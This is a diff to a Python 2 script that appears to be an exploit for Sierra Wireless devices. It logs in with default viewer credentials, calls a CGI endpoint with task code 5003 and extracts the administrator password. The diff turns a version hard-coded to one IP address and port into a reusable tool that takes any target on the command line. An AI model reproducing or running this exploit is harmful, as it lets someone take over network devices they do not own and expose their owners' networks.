@@ -1,10 +1,13 @@
+import argparse
+import sys
 import logging
 import httplib
 import re
 from termcolor import colored
 
 class SierraWirelessPasswordRecovery:
-    def __init__(self):
+    def __init__(self, target, port):
+        self.verbose = False
         self.headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
                    "Content-Type": "text/xml",
                    "Accept": "application/xml, text/xml, */*; q=0.01",
@@ -18,8 +21,8 @@ class SierraWirelessPasswordRecovery:
         self.cgi_get_task = {"path": "/cgi-bin/Embedded_Ace_Get_Task.cgi",
                         "method": "POST",
                         "payload": "5003"}
-        self.host = '166.148.198.169'
-        self.port = '9191'
+        self.target = target
+        self.port = port
         self.user = 'viewer'
         self.password = '12345'
         self.cookie = ''
@@ -27,15 +30,17 @@ class SierraWirelessPasswordRecovery:
     def get_cookie(self):
         self.xml_connect_payload = self.xml_connect_payload.replace("$username$", self.user)
         self.xml_connect_payload = self.xml_connect_payload.replace("$password$", self.password)
-        print "[*] Establishing a session..."
-        conn = httplib.HTTPConnection(self.host, self.port, timeout=25)
+        if self.verbose:
+            print "[*] Establishing a session..."
+        conn = httplib.HTTPConnection(self.target, self.port, timeout=25)
         conn.request(self.xml_connect['method'], self.xml_connect['path'], 
                      self.xml_connect_payload, self.headers)
         response = conn.getresponse()
         data = response.read()
         headers = response.getheaders()
         cookie = headers[1][1].split(';')
-        print "[*] Cookie recovered: {0}".format(colored(cookie[0], 'green'))
+        if self.verbose:
+            print "[*] Cookie recovered: {0}".format(colored(cookie[0], 'green'))
         self.cookie = cookie[0]
         # print data
 
@@ -43,8 +48,9 @@ class SierraWirelessPasswordRecovery:
         headers_with_cookie = self.headers.update({'Cookie': self.cookie})
         # print headers_with_cookie
         # print self.headers
-        print "[*] Running cgi-bin to recover admin password..."
-        conn = httplib.HTTPConnection(self.host, self.port, timeout=25)
+        if self.verbose:
+            print "[*] Running cgi-bin to recover admin password..."
+        conn = httplib.HTTPConnection(self.target, self.port, timeout=25)
         conn.request(self.cgi_get_task['method'], self.cgi_get_task['path'],
                      self.cgi_get_task['payload'], self.headers)
         response = conn.getresponse()
@@ -54,10 +60,24 @@ class SierraWirelessPasswordRecovery:
         # print data
         recovered_password = re.findall(r"5003=(?P<password>.*)!", str(data))
         if recovered_password:
-            print "[*] Admin password recovered: {0}".format(colored(recovered_password[0], 'red'))
+            if self.verbose:
+                print "[*] Admin password recovered: {0}".format(colored(recovered_password[0], 'red'))
+            return recovered_password
+
 
 def main():
-    swpr = SierraWirelessPasswordRecovery()
+    # parser = argparse.ArgumentParser(description="Recover an administrator password from Sierra Wireless devices.")
+    # parser.add_argument(['-t', '--target'], dest='target', type='string', required=True,
+    #                     help='IP address to target for password recovery.')
+    # parser.add_argument(['-p', '--port'], dest='port', type='string', required=True,
+    #                     help='Port to web portal interface.')
+    # args = parser.parse_args()
+
+    target = sys.argv[1]
+    port = sys.argv[2]
+
+    swpr = SierraWirelessPasswordRecovery(target, port)
+    swpr.verbose = True
     swpr.get_cookie()
     swpr.get_admin_password()
 
